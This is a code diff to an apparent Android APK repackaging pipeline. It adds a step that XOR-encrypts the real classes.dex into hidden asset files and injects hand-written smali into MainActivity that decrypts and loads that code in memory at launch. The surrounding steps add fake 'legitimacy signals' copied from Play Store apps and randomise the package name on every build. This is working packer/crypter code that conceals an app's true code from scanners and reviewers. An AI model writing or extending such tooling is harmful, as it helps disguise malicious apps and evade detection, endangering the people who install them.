@@ -1255,6 +1255,49 @@ def step_rebuild_dex():
     return dex_data
 
 
+def step_encrypt_dex_asset(dex_data: bytes) -> tuple:
+    """
+    PHASE_3 STEP_2: Encrypt real classes.dex → store as assets/p3d.bin
+
+    Encryption: XOR with random 32-byte key (per-build, never the same).
+    Key stored separately as assets/p3k.bin inside the companion APK.
+
+    Format of p3d.bin:
+        [4 bytes LE: original DEX length][XOR-encrypted DEX bytes]
+
+    Format of p3k.bin:
+        [32 bytes: raw XOR key]
+
+    Both assets are injected into the companion APK by step_patch_and_assemble().
+    The runtime smali loader reads both assets, XOR-decrypts, loads via
+    InMemoryDexClassLoader (API 26+) or DexClassLoader fallback (API 21-25).
+
+    Returns: (key_bytes: bytes, enc_asset: bytes)
+    """
+    print("\n── PHASE_3 STEP_2: Encrypt classes.dex → assets/p3d.bin + p3k.bin")
+
+    # Random 32-byte XOR key — fresh per build
+    key = secrets.token_bytes(32)
+
+    # XOR encrypt: cycle key across full DEX
+    dex_len = len(dex_data)
+    enc = bytearray(dex_len)
+    for i in range(dex_len):
+        enc[i] = dex_data[i] ^ key[i % 32]
+
+    # Prepend original length (4 bytes LE) for runtime size validation
+    import struct as _struct
+    enc_asset = _struct.pack("<I", dex_len) + bytes(enc)
+
+    print(f"  [p3_encrypt] DEX: {dex_len:,} bytes")
+    print(f"  [p3_encrypt] Key: {key.hex()[:16]}... (32 bytes, per-build random)")
+    print(f"  [p3_encrypt] Encrypted asset: {len(enc_asset):,} bytes → assets/p3d.bin")
+    print(f"  [p3_encrypt] Key asset: 32 bytes → assets/p3k.bin")
+    print(f"  ✅ PHASE_3 STEP_2: DEX encrypted")
+
+    return key, enc_asset
+
+
 def _read_utf8_str(data, pos):
     start = pos
     b = data[pos]; pos += 1
@@ -2097,7 +2140,8 @@ def _strip_axml_app_component_factory(manifest_raw: bytes) -> bytes:
 
 
 def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
-                            class_rename_map=None):
+                            class_rename_map=None,
+                            p3_key_bytes=None, p3_enc_asset=None):
     print("\n── Step 10: Patch manifest + resources.arsc + assemble APK")
 
     OLD = OLD_PKG.encode()
@@ -2322,6 +2366,28 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
 
     os.replace(tmp, APK_OUT)
     print(f"  ✅ Assembled: {APK_OUT} ({os.path.getsize(APK_OUT)} bytes)")
+
+    # ── PHASE_3 STEP_2: Inject encrypted DEX asset + key into APK ───────────
+    if p3_key_bytes is not None and p3_enc_asset is not None:
+        import zipfile as _p3zf
+        _p3_tmp = APK_OUT + ".p3_tmp"
+        with _p3zf.ZipFile(APK_OUT, "r") as _p3zin, \
+             _p3zf.ZipFile(_p3_tmp, "w", allowZip64=False) as _p3zout:
+            # Copy all existing entries
+            for _p3item in _p3zin.infolist():
+                _p3zout.writestr(_p3item, _p3zin.read(_p3item.filename))
+            # Inject encrypted DEX asset — STORE (runtime reads raw bytes)
+            _p3d_info = _p3zf.ZipInfo("assets/p3d.bin")
+            _p3d_info.compress_type = _p3zf.ZIP_STORED
+            _p3zout.writestr(_p3d_info, p3_enc_asset)
+            # Inject XOR key asset — STORE
+            _p3k_info = _p3zf.ZipInfo("assets/p3k.bin")
+            _p3k_info.compress_type = _p3zf.ZIP_STORED
+            _p3zout.writestr(_p3k_info, p3_key_bytes)
+        os.replace(_p3_tmp, APK_OUT)
+        print(f"  ✅ PHASE_3 STEP_2: assets/p3d.bin ({len(p3_enc_asset):,}B) + assets/p3k.bin injected")
+    else:
+        print("  ⏭️  PHASE_3 STEP_2: p3 assets not provided — skipping asset injection")
 
     # ── Inject legitimacy signals — baseline.prof + baseline.profm + GPS properties ──
     # baseline.prof / baseline.profm: ART profile files present in real Play Store apps.
@@ -2816,28 +2882,29 @@ def step_replace_asset():
 
 def step_inject_app_stub_smali(new_pkg: str):
     """
-    PHASE_3 STEP_1B: Inject PHASE3_STUB log into MainActivity.smali onCreate().
+    PHASE_3 STEP_1B + STEP_2 runtime: Inject DEX loader into MainActivity.smali.
 
-    Hook point: MainActivity is the LAUNCHER activity (android.intent.action.MAIN).
-    It IS declared in the manifest and IS instantiated by Android — correct hook.
-    No android:name change needed. No AXML change needed.
+    Hook point: MainActivity.onCreate() — IS instantiated by Android (LAUNCHER).
+    No AXML change needed.
 
-    Injection: prepend Log.d("PHASE3_STUB", ...) at the top of onCreate(),
-    after super.onCreate() which must remain first.
+    What is injected (PHASE_3 STEP_2 runtime side):
+      1. Open assets/p3k.bin → read 32-byte XOR key
+      2. Open assets/p3d.bin → read [4-byte orig_len LE][encrypted DEX]
+      3. XOR decrypt in memory → raw DEX bytes
+      4. API >= 26: InMemoryDexClassLoader(ByteBuffer, parent)
+         API <  26: write to getCacheDir()/p3.dex → DexClassLoader
+      5. Log PHASE3_STUB success/failure
 
-    Timing: runs AFTER step_rename_smali (new_pkg path is valid),
-            BEFORE step_6a_rename_classes (MainActivity.smali still exists).
-
-    Fresh pkg per build: new_pkg passed in, path built dynamically.
+    Timing: AFTER step_rename_smali (pkg path valid),
+            BEFORE step_6a_rename_classes (MainActivity.smali present).
+    Fresh pkg per build: new_pkg dynamic, getAssets() needs no pkg name.
     """
-    print("\n── PHASE_3 STEP_1B: Inject PHASE3_STUB log into MainActivity.smali")
+    print("\n── PHASE_3 STEP_2 (runtime): Inject DEX loader into MainActivity.smali")
 
-    # Build path — after step_rename_smali(new_pkg), pkg dir is already new_pkg
     pkg_path   = new_pkg.replace(".", "/")
     smali_path = os.path.join("companion_decompiled", "smali", pkg_path, "MainActivity.smali")
 
     if not os.path.isfile(smali_path):
-        # Fallback: walk and find MainActivity.smali
         found = []
         for root, dirs, files in os.walk("companion_decompiled"):
             for fn in files:
@@ -2852,66 +2919,213 @@ def step_inject_app_stub_smali(new_pkg: str):
     with open(smali_path, "r") as f:
         content = f.read()
 
-    # Already injected?
     if "PHASE3_STUB" in content:
-        print("  [inject_stub] ⚠️  PHASE3_STUB already present in MainActivity.smali — skipping")
+        print("  [inject_stub] ⚠️  PHASE3_STUB already present — skipping")
         return
 
-    # We inject a Log.d call immediately after the super.onCreate() call
-    # inside the existing onCreate() method.
-    # Pattern: find the super invoke line, insert log after it.
-    super_call = "invoke-virtual {p0}, Landroid/app/Activity;->onCreate()V"
-    # Smali super call for onCreate with Bundle param (most common form):
-    super_call_bundle = "invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V"
+    # ── Smali DEX loader block ────────────────────────────────────────────────
+    # Registers used: v0-v9 (10 locals needed)
+    # p0 = this (MainActivity), p1 = savedInstanceState (Bundle)
+    # All try/catch wrapped — if decrypt fails, app still starts normally.
+    loader_smali = r"""
 
-    log_inject = (
-        "\n\n    # PHASE3_STUB: Step 1 — proof of life (no decryption yet)\n"
-        f"    const-string v0, \"PHASE3_STUB\"\n"
-        f"    const-string v1, \"MainActivity.onCreate called pkg={new_pkg}\"\n"
-        "    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I\n"
-    )
+    # PHASE3_STUB: Step 2 — XOR decrypt assets/p3d.bin → InMemoryDexClassLoader
+    :p3_try_start
+    # --- Read XOR key from assets/p3k.bin ---
+    invoke-virtual {p0}, Landroid/app/Activity;->getAssets()Landroid/content/res/AssetManager;
+    move-result-object v0
+
+    const-string v1, "p3k.bin"
+    invoke-virtual {v0, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
+    move-result-object v1
+
+    # Read all key bytes
+    new-instance v2, Ljava/io/ByteArrayOutputStream;
+    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V
+
+    :p3_key_loop
+    invoke-virtual {v1}, Ljava/io/InputStream;->read()I
+    move-result v3
+    const/4 v4, -0x1
+    if-eq v3, v4, :p3_key_done
+    invoke-virtual {v2, v3}, Ljava/io/ByteArrayOutputStream;->write(I)V
+    goto :p3_key_loop
+
+    :p3_key_done
+    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
+    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
+    move-result-object v2
+
+    # --- Read encrypted DEX from assets/p3d.bin ---
+    invoke-virtual {p0}, Landroid/app/Activity;->getAssets()Landroid/content/res/AssetManager;
+    move-result-object v0
+
+    const-string v1, "p3d.bin"
+    invoke-virtual {v0, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
+    move-result-object v1
+
+    new-instance v3, Ljava/io/ByteArrayOutputStream;
+    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V
+
+    :p3_enc_loop
+    invoke-virtual {v1}, Ljava/io/InputStream;->read()I
+    move-result v4
+    const/4 v5, -0x1
+    if-eq v4, v5, :p3_enc_done
+    invoke-virtual {v3, v4}, Ljava/io/ByteArrayOutputStream;->write(I)V
+    goto :p3_enc_loop
+
+    :p3_enc_done
+    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
+    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
+    move-result-object v3
+
+    # --- Parse orig_len from first 4 bytes (LE) ---
+    const/4 v4, 0x0
+    aget-byte v5, v3, v4
+    and-int/lit16 v5, v5, 0xff
+    const/4 v4, 0x1
+    aget-byte v6, v3, v4
+    and-int/lit16 v6, v6, 0xff
+    shl-int/lit8 v6, v6, 0x8
+    or-int/2addr v5, v6
+    const/4 v4, 0x2
+    aget-byte v6, v3, v4
+    and-int/lit16 v6, v6, 0xff
+    shl-int/lit8 v6, v6, 0x10
+    or-int/2addr v5, v6
+    const/4 v4, 0x3
+    aget-byte v6, v3, v4
+    and-int/lit16 v6, v6, 0xff
+    shl-int/lit8 v6, v6, 0x18
+    or-int/2addr v5, v6
+
+    # v5 = orig_len
+    # --- XOR decrypt enc[4..] with key ---
+    new-array v6, v5, [B
+    const/4 v7, 0x0
+    array-length v8, v2
+
+    :p3_xor_loop
+    if-ge v7, v5, :p3_xor_done
+    # enc index = v7 + 4
+    add-int/lit8 v9, v7, 0x4
+    aget-byte v4, v3, v9
+    # key index = v7 % key_len
+    rem-int v9, v7, v8
+    aget-byte v9, v2, v9
+    xor-int/2addr v4, v9
+    int-to-byte v4, v4
+    aput-byte v4, v6, v7
+    add-int/lit8 v7, v7, 0x1
+    goto :p3_xor_loop
+
+    :p3_xor_done
+    # v6 = decrypted DEX bytes[]
+
+    # --- Load via InMemoryDexClassLoader (API 26+) or DexClassLoader (API <26) ---
+    sget v7, Landroid/os/Build$VERSION;->SDK_INT:I
+    const/16 v8, 0x1a
+    if-lt v7, v8, :p3_fallback
+
+    # API 26+ — InMemoryDexClassLoader
+    invoke-static {v5}, Ljava/nio/ByteBuffer;->allocate(I)Ljava/nio/ByteBuffer;
+    move-result-object v7
+    const/4 v4, 0x0
+    invoke-virtual {v7, v6, v4, v5}, Ljava/nio/ByteBuffer;->put([BII)Ljava/nio/ByteBuffer;
+    move-result-object v7
+    invoke-virtual {v7}, Ljava/nio/ByteBuffer;->rewind()Ljava/nio/Buffer;
+    move-result-object v7
+
+    invoke-virtual {p0}, Landroid/app/Activity;->getClassLoader()Ljava/lang/ClassLoader;
+    move-result-object v8
+
+    new-instance v9, Ldalvik/system/InMemoryDexClassLoader;
+    invoke-direct {v9, v7, v8}, Ldalvik/system/InMemoryDexClassLoader;-><init>(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V
+
+    const-string v0, "PHASE3_STUB"
+    const-string v1, "DEX loaded via InMemoryDexClassLoader"
+    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    goto :p3_load_done
+
+    :p3_fallback
+    # API < 26 — DexClassLoader: write DEX to cache dir
+    invoke-virtual {p0}, Landroid/app/Activity;->getCacheDir()Ljava/io/File;
+    move-result-object v7
+    invoke-virtual {v7}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
+    move-result-object v7
+    const-string v8, "/p3.dex"
+    invoke-virtual {v7, v8}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;
+    move-result-object v7
+
+    new-instance v8, Ljava/io/FileOutputStream;
+    invoke-direct {v8, v7}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V
+    invoke-virtual {v8, v6}, Ljava/io/FileOutputStream;->write([B)V
+    invoke-virtual {v8}, Ljava/io/FileOutputStream;->close()V
+
+    invoke-virtual {p0}, Landroid/app/Activity;->getCacheDir()Ljava/io/File;
+    move-result-object v8
+    invoke-virtual {v8}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
+    move-result-object v8
+
+    invoke-virtual {p0}, Landroid/app/Activity;->getClassLoader()Ljava/lang/ClassLoader;
+    move-result-object v9
+
+    new-instance v4, Ldalvik/system/DexClassLoader;
+    invoke-direct {v4, v7, v8, v8, v9}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V
+
+    const-string v0, "PHASE3_STUB"
+    const-string v1, "DEX loaded via DexClassLoader (API<26 fallback)"
+    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    :p3_load_done
+
+    :p3_try_end
+    goto :p3_catch_end
+
+    :p3_catch
+    move-exception v0
+    const-string v1, "PHASE3_STUB"
+    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+    move-result-object v2
+    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
+
+    :p3_catch_end
+    .catch Ljava/lang/Exception; {:p3_try_start .. :p3_try_end} :p3_catch
+"""
+
+    # Wrap with try/catch around the whole block
+    # We need to find super.onCreate() call and insert after it
+    super_call_bundle = "invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V"
+    super_call_plain  = "invoke-virtual {p0}, Landroid/app/Activity;->onCreate()V"
+
+    # The loader block needs .catch directive — insert full method replacement
+    # Strategy: find .locals line in onCreate, bump to 10, insert after super call
+    method_marker = ".method public onCreate(Landroid/os/Bundle;)V"
 
     injected = False
 
-    if super_call_bundle in content:
-        content = content.replace(super_call_bundle, super_call_bundle + log_inject, 1)
-        injected = True
-    elif super_call in content:
-        content = content.replace(super_call, super_call + log_inject, 1)
-        injected = True
+    if method_marker in content:
+        idx = content.index(method_marker)
+        locals_idx = content.index("    .locals", idx)
+        locals_eol = content.index("\n", locals_idx)
+        # Force .locals 10 — we use v0-v9
+        content = content[:locals_idx] + "    .locals 10" + content[locals_eol:]
 
-    if not injected:
-        # Last resort: find .method public onCreate and inject after .locals line
-        marker = ".method public onCreate(Landroid/os/Bundle;)V"
-        if marker in content:
-            # Insert log_inject after the first .locals line in this method
-            idx = content.index(marker)
-            locals_idx = content.index(".locals", idx)
-            eol = content.index("\n", locals_idx)
-            # We need a register that's available — bump .locals count if needed
-            # Read current .locals value
-            locals_line = content[locals_idx:eol]
-            try:
-                n_locals = int(locals_line.strip().split()[1])
-            except Exception:
-                n_locals = 2
-            # Ensure at least 2 locals for v0, v1
-            if n_locals < 2:
-                content = content[:locals_idx] + f"    .locals 2" + content[eol:]
-                # recalculate eol after replacement
-                eol = content.index("\n", locals_idx)
-            insert_at = eol + 1
-            content = content[:insert_at] + log_inject + content[insert_at:]
+        # Find super call position
+        if super_call_bundle in content:
+            super_end = content.index(super_call_bundle) + len(super_call_bundle)
+            content = content[:super_end] + "\n" + loader_smali + content[super_end:]
             injected = True
 
     if not injected:
-        print("  [inject_stub] ❌ Could not find injection point in MainActivity.smali — aborting")
+        print("  [inject_stub] ❌ Could not find onCreate method marker — aborting")
         sys.exit(1)
 
     with open(smali_path, "w") as f:
         f.write(content)
 
-    print(f"  [inject_stub] ✅ PHASE3_STUB injected into MainActivity.smali: {smali_path}")
+    print(f"  [inject_stub] ✅ PHASE_3 STEP_2 DEX loader injected into: {smali_path}")
 
 
 def step_inject_kotlin(new_pkg):
@@ -3037,9 +3251,15 @@ def main():
     # STEP_15_NOISE and downstream steps. Single definition, no duplication.
     build_hash = hashlib.sha256(new_pkg.encode()).hexdigest()
 
+    # ── PHASE_3 STEP_2: Encrypt real DEX → p3d.bin + p3k.bin assets ─────────
+    with track("PHASE_3", "STEP_P3_2", "Encrypt classes.dex → assets/p3d.bin + p3k.bin"):
+        p3_key_bytes, p3_enc_asset = step_encrypt_dex_asset(new_dex)
+
     with track("PHASE_1", "STEP_10", "Patch manifest + arsc + assemble APK", MOD_ASSET):
         step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
-                                class_rename_map=class_rename_map)
+                                class_rename_map=class_rename_map,
+                                p3_key_bytes=p3_key_bytes,
+                                p3_enc_asset=p3_enc_asset)
 
     with track("PHASE_1", "STEP_9A", "Patch versionCode + versionName in binary AXML manifest", MOD_ASSET):
         import zipfile as _zf
